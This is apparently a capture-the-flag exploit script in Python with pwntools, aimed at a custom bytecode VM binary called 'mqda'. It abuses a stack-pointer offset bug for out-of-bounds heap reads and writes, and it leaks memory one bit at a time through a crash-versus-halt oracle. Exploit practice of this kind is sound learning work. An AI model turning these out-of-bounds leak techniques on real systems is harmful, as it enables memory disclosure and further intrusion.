#!/usr/bin/env python3
"""
Heap Leak Test

Since we can read OOB from page data, let's see what's in the heap metadata area.
When we read from page[0x103..0x106], we might get interesting data from:
- Next chunk's prev_size (if free)
- Garbage from previous allocations

Let me test reading from the OOB area of a freshly allocated page.
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def hlt():
    return bytes([0x00])

def trigger_illegal():
    return bytes([0xFF])

def create_bit_test(code_addr, read_addr, bit_position, expected_bit):
    """Create code that tests a bit at read_addr."""
    code = b''
    code += mov_reg_imm(15, read_addr)  # SP = read_addr
    code += pop_reg(0)                   # r0 = [SP+4], SP += 4
    
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = code_addr + len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit(code_addr, read_addr, bit_position, expected_bit=1):
    """Test a bit at read_addr."""
    code = create_bit_test(code_addr, read_addr, bit_position, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(str(code_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(code_addr).encode())
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte(code_addr, read_addr):
    """Leak a byte at read_addr."""
    val = 0
    for bit in range(8):
        if test_bit(code_addr, read_addr, bit, 1):
            val |= (1 << bit)
    return val

def leak_dword(code_addr, read_addr):
    """Leak a 32-bit value at read_addr."""
    val = 0
    for i in range(4):
        byte_val = leak_byte(code_addr, read_addr + i)
        val |= byte_val << (i * 8)
    return val

# The POP instruction reads from [SP+4]. SP is the 24-bit page address + 8-bit offset.
# If SP = 0x200FF, it reads from page 0x200 at offset 0xFF + 4 = 0x103
# After POP, SP = 0x20103. Now we can read the NEXT page!

# Actually, wait. If SP = 0x200FF:
# POP reads [0x200FF + 4] which is interpreted as page (0x20103 >> 8) = 0x201, offset 0x03
# Hmm, that's not OOB read then.

# Let me reconsider. The SP is stored as a 32-bit value.
# page_addr = SP >> 8, offset = SP & 0xFF
# [SP + 4] means the value at page + offset + 4 in the page data

# PUSH stores at [SP + 4] then SP -= 4
# POP reads from [SP + 4] then SP += 4

# For OOB read at offset 0x103 of a page, we need:
# offset + 4 = 0x103, so offset = 0xFF
# SP & 0xFF = 0xFF
# SP >> 8 = target page

# So POP at SP = 0x200FF reads page[0x103], which is beyond 256-byte data area!

print("[*] Testing OOB read via POP...")

code_addr = 0x10000
stack_page = 0x200FF  # Page 0x200, offset 0xFF -> reads at 0x103

# First write a marker value via PUSH at the OOB location
code = b''
code += mov_reg_imm(15, stack_page)      # SP = 0x200FF
code += mov_reg_imm(0, 0xCAFEBABE)
code += push_reg(0)                       # Write 0xCAFEBABE at page[0x103], SP = 0x200FB
code += mov_reg_imm(15, stack_page)      # SP = 0x200FF again
code += pop_reg(1)                        # r1 = [0x200FF + 4] = page[0x103] = 0xCAFEBABE, SP = 0x20103
# Now r1 should contain 0xCAFEBABE if OOB read works

# Let's verify by comparing
code += mov_reg_imm(2, 0xCAFEBABE)
code += cmp_reg_reg(1, 2)
# If equal, flags should indicate equality. JNE would NOT jump.
# With our inverted semantics, JNE jumps when EQUAL

current = code_addr + len(code)
success_addr = current + 6 + 2 + 1  # After MOV+JNE+ILLEGAL

code += mov_reg_imm(3, success_addr)
code += jne_reg(3)                        # Jump to success if equal
code += trigger_illegal()                 # Reach here if not equal
code += hlt()                             # Success!

print(f"[*] Code length: {len(code)}")

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')
p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=2)
print(f"[*] Output: {output}")

if b'TERMINATED' in output:
    print("[+] OOB read worked! Read back 0xCAFEBABE correctly!")
else:
    print("[-] OOB read failed or didn't match")

p.close()
